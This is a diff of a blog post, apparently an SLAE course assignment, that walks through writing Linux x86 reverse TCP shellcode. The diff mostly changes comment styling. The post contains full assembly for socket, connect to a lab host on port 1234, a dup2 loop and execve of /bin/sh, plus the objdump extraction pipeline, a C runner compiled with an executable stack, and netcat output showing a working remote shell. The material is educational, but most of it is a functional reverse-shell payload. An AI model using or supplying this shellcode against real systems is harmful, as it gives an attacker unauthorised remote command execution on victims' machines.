@@ -31,6 +31,7 @@ tags:
 <blockquote>The code and scripts for this assignment can be found on my <a href="https://github.com/xvass/SLAE/tree/master/Assignment2">github</a></blockquote>
 <blockquote>All the development and tests have been implemented in the following architecture</blockquote>
 <blockquote><strong>Linux kali 5.4.0-kali2-686-pae #1 SMP Debian 5.4.8-1kali1 (2020-01-06) i686 GNU/Linux&nbsp;</strong></blockquote>
+
 <p style="text-align:justify;">
 For this assignment the following <strong>C</strong> program will be used as a base program in order to create our shellcode
 </p>
@@ -92,7 +93,9 @@ execve
 #define SYS_CONNECT 3 /* sys_connect(2) */
 </pre>
 
+<p style="text-align:justify;">
 Proceeding further, it is time to create the <strong>reverse.nasm</strong> file. Before starting to write the reverse tcp shellcode in assembly, the registers <strong>eax</strong>&nbsp; and <strong>edx</strong>&nbsp; will be zeroed out as follows
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 global _start 
@@ -100,8 +103,8 @@ section .text
 
 _start:  
 
-xor eax, eax  ;zero out eax register  
-mul edx       ;zero out edx register
+xor eax, eax  <span style="color:#33cccc;">;zero out eax register</span>  
+mul edx       <span style="color:#33cccc;">;zero out edx register</span>
 </pre>
 
 <p style="text-align:justify;">In order to be able to call socket system calls such as <strong>socket</strong> and <strong>connect , </strong>first&nbsp;we must use another system call named <strong>socketcall</strong> which used to determine which socket system call is about to be used. The <strong>socketcall</strong> prototype is as follows</p>
@@ -128,7 +131,9 @@ int socketcall(int call, unsigned long *args);
  	<li style="text-align:justify;"><strong>ecx, edx, ebx, esi, edi, ebp</strong> are used to pass 6 parameter arguments to system call functions</li>
  	<li style="text-align:justify;">All other registers including <strong>EFLAGS</strong> are preserved across the <strong>int 0x80 </strong>instruction.</li>
 </ul>
+<p style="text-align:justify;">
 The next step is to create the new socket. Following is the <strong>socket</strong> system call prototype
+</p>
 <h3>Socket Function Synopsis</h3>
 
 ```c
@@ -225,15 +230,15 @@ SOCK_NONBLOCK = 04000 /* Atomically mark descriptor(s) as
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;;sockfd = socket(AF_INET,SOCK_STREAM,0);
-push edx       ; push 0 on the stack which is related with the third argument of the socket system call
-mov ebx, edx   ; zero out ebx  
-inc ebx        ; define the SYS_SOCKET value to be 0x1. 
-push ebx       ; SOCK_STREAM constant at type argument
-push 0x2       ; AF_INET constant at domain argument 
-mov ecx, esp   ; ECX will point to args at the top of the stack 
-mov al, 0x66   ; call SocketCall() >
-int 0x80       ; call system call interrupt to execute the</span> <span style="color:#33cccc;">arguments</span> 
-mov edi, eax   ; EAX will store the return value of the socket descriptor to edi register 
+push edx       <span style="color:#33cccc;">; push 0 on the stack which is related with the third argument of the socket system call </span>
+mov ebx, edx   <span style="color:#33cccc;">; zero out ebx  </span>
+inc ebx        <span style="color:#33cccc;">; define the SYS_SOCKET value to be 0x1 </span>
+push ebx       <span style="color:#33cccc;">; SOCK_STREAM constant at type argument </span>
+push 0x2       <span style="color:#33cccc;">; AF_INET constant at domain argument </span>
+mov ecx, esp   <span style="color:#33cccc;">; ECX will point to args at the top of the stack </span>
+mov al, 0x66   <span style="color:#33cccc;">; call SocketCall() </span>
+int 0x80       <span style="color:#33cccc;">; call system call interrupt to execute the</span> <span style="color:#33cccc;">arguments</span> 
+mov edi, eax   <span style="color:#33cccc;">; EAX will store the return value of the socket descriptor to edi register </span>
 </pre>
 
 <p style="text-align:justify;">Also, regarding the second argument of the <strong>socketcall</strong> system call, the low order register <strong>bl </strong>of<strong> ebx </strong>register&nbsp;will be assigned with the value <strong>0x1</strong>&nbsp;which indicates the <strong>SYS_SOCKET</strong><strong>&nbsp;</strong>constant as we see below in red</p>
@@ -283,18 +288,18 @@ int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
 ;; sa.sin_port = htons(REMOTE_PORT);
 ;; connect(sockfd, (struct sockaddr *)sa, sizeof(sa));
 
-pop ebx          ; assign ebx with value (2)
-push 0x04c8a8c0  ; push IP 192.168.200.4 on the stack
-push word 0xd204 ; push port 1234 on the stack 
-push bx          ; push AF_INET constant into the 16 bytes register avoiding nulls 
-mov ecx, esp     ; perform stack alignment - ecx points to struct 
-push 0x10        ; the size of the port  
-push ecx         ; pointer to host_addr struct
-push edi         ; save socket descriptor sockfd to struct
-mov ecx, esp     ; perform stack alignment - ecx points at struct 
-inc ebx          ; use the connect system call (3) 
-mov al, 0x66     ; call the socketcall system call
-int 0x80         ; call interrupt
+pop ebx          <span style="color:#33cccc;">; assign ebx with value (2) </span>
+push 0x04c8a8c0  <span style="color:#33cccc;">; push IP 192.168.200.4 on the stack </span>
+push word 0xd204 <span style="color:#33cccc;">; push port 1234 on the stack </span>
+push bx          <span style="color:#33cccc;">; push AF_INET constant into the 16 bytes register avoiding nulls </span>
+mov ecx, esp     <span style="color:#33cccc;">; perform stack alignment - ecx points to struct </span>
+push 0x10        <span style="color:#33cccc;">; the size of the port  </span>
+push ecx         <span style="color:#33cccc;">; pointer to host_addr struct </span>
+push edi         <span style="color:#33cccc;">; save socket descriptor sockfd to struct </span>
+mov ecx, esp     <span style="color:#33cccc;">; perform stack alignment - ecx points at struct </span>
+inc ebx          <span style="color:#33cccc;">; use the connect system call (3) </span>
+mov al, 0x66     <span style="color:#33cccc;">; call the socketcall system call </span>
+int 0x80         <span style="color:#33cccc;">; call interrupt </span>
 </pre>
 
 <p style="text-align:justify;">As seen at the code above in red, the tcp PORT and the IP are in hex format. They both pushed on the stack after transformed in network byte order. That happened because ports and addresses are always specified in calls to the socket functions using the network byte order convention. This convention is a method of sorting bytes independently of specific machine architectures. The following python script does the network byte convention and then transforms the decimal value into hex in order to use it when the port pushed on the stack</p>
@@ -312,7 +317,9 @@ nport = socket.htons(int(port))
 print "Port in hex Network Byte order : " , hex(nport)
 ```
 
+<p style="text-align:justify;">
 the following output of the script above shows the output of the IP 192.168.200.4 and PORT 1234 in network byte order.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># python naddr.py 192.168.200.4 1234
@@ -334,18 +341,18 @@ int dup2(int oldfd, int newfd);
 
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-;;dup2(sockfd, 2); 
-;;dup2(sockfd, 1); 
-;;dup2(sockfd, 0);
+<span style="color:#33cccc;">;;dup2(sockfd, 2);</span>
+<span style="color:#33cccc;">;;dup2(sockfd, 1); </span>
+<span style="color:#33cccc;">;;dup2(sockfd, 0);</span>
    
-mov ebx, esi  ; move sockfd descriptor to ebx 
-xor ecx, ecx  ; zero out the ecx register before using it 
+mov ebx, esi   <span style="color:#33cccc;">; move sockfd descriptor to ebx </span>
+xor ecx, ecx   <span style="color:#33cccc;">; zero out the ecx register before using it </span> 
 lo:
-  mov al, 0x3f ; the functional number that indicates dup2 (63 in dec)
-  int 0x80     ; call dup2 syscall
-  inc ecx      ; increase the value of ecx by 1 so it will take all values 0(stdin), 1(stdout), 2(stderr)
-  cmp cl, 0x2  ; compare ecx with 2 which indicates the stderr descriptor
-  jle lo       ; loop until counter is less or equal to 2
+  mov al, 0x3f <span style="color:#33cccc;">; the functional number that indicates dup2 (63 in dec) </span>
+  int 0x80     <span style="color:#33cccc;">; call dup2 syscall  </span>
+  inc ecx      <span style="color:#33cccc;">; increase the value of ecx by 1 so it will take all values 0(stdin), 1(stdout), 2(stderr) </span>
+  cmp cl, 0x2  <span style="color:#33cccc;">; compare ecx with 2 which indicates the stderr descriptor </span>
+  jle lo       <span style="color:#33cccc;">; loop until counter is less or equal to 2 </span>
 </pre>
 
 <h3>execve Function Synopsis</h3>
@@ -363,17 +370,17 @@ char *const&nbsp;envp[]);
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ;; execve("/bin/sh", 0, 0);
-xor eax, eax      ; zero out the eax register
-push eax          ; push NULL into the stack  
-push 0x68732f2f   ; push "hs//" in reverse order into stack
-push 0x6e69622f   ; push "nib/" in reverse order into stack
-mov ebx, esp      ; point ebx into stack
-push eax          ; push NULL into the stack
-mov edx, esp      ; point to edx into stack 
-push ebx          ; push ebx into stack
-mov ecx, esp      ; point to ecx into stack
-mov al, 0xb       ; 0xb indicates the execve syscall
-int 0x80          ; execute execve syscall
+xor eax, eax      <span style="color:#33cccc;">; zero out the eax register </span>
+push eax          <span style="color:#33cccc;">; push NULL into the stack  </span>
+push 0x68732f2f   <span style="color:#33cccc;">; push "hs//" in reverse order into stack </span>
+push 0x6e69622f   <span style="color:#33cccc;">; push "nib/" in reverse order into stack </span>
+mov ebx, esp      <span style="color:#33cccc;">; point ebx into stack </span>
+push eax          <span style="color:#33cccc;">; push NULL into the stack </span>
+mov edx, esp      <span style="color:#33cccc;">; point to edx into stack </span>
+push ebx          <span style="color:#33cccc;">; push ebx into stack </span>
+mov ecx, esp      <span style="color:#33cccc;">; point to ecx into stack </span>
+mov al, 0xb       <span style="color:#33cccc;">; 0xb indicates the execve syscall </span>
+int 0x80          <span style="color:#33cccc;">; execute execve syscall </span>
 </pre>
 
 <p style="text-align:justify;">As just shown, the <strong>/bin/sh</strong> string is pushed onto the stack in reverse order by first pushing the terminating null value of the string, and then pushing the <strong>//sh (4 bytes are required for alignment and the second / has no effect)</strong>, and finally pushing the<strong> /bin</strong> onto the stack. At this point, we have all that we need on the stack, so <strong>esp</strong> now points to the location of <strong>/bin/sh</strong>.</p>
@@ -414,8 +421,9 @@ netstat -antp | grep 1234
 tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
 </pre>
 
-
+<p style="text-align:justify;">
 Moreover, in order to create the configurable shellcode, the first thing to do is to use the following command to create the shellcode
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># objdump -d ./reverse|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
@@ -486,13 +494,17 @@ ret();
 }
 ```
 
+<p style="text-align:justify;">
 the following command will be used to compile the program above
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 r<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># gcc -fno-stack-protector  -z execstack -m32 -o revshell revshell.c
 </pre>
 
+<p style="text-align:justify;">
 Furthermore, as seen below when the <strong>revshell</strong> program runs, then if a target machine listens to specific port&nbsp; ( e.g <strong>1234</strong> using a listener ) , then a new connection starts on the target machine.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment2</b></span># ./revshell 192.168.200.4 1234
@@ -500,7 +512,6 @@ Shellcode Length: 84
 </pre>
 
 As we see below the communication has been established with the target machine on port <strong>1234</strong> and we can run commands remotely
-
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ~ nc -nlv 1234 
@@ -510,8 +521,9 @@ netstat -antp | grep 1234
 tcp 0 0 192.168.200.13:50914 192.168.200.4:1234 ESTABLISHED 812/s
 </pre>
 
+<p style="text-align:justify;">
 Furthermore, after the successful connection to the target machine, we will use the following python command in order to have a bash prompt to the open shell above
-
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 ~ nc -nlv 1234 
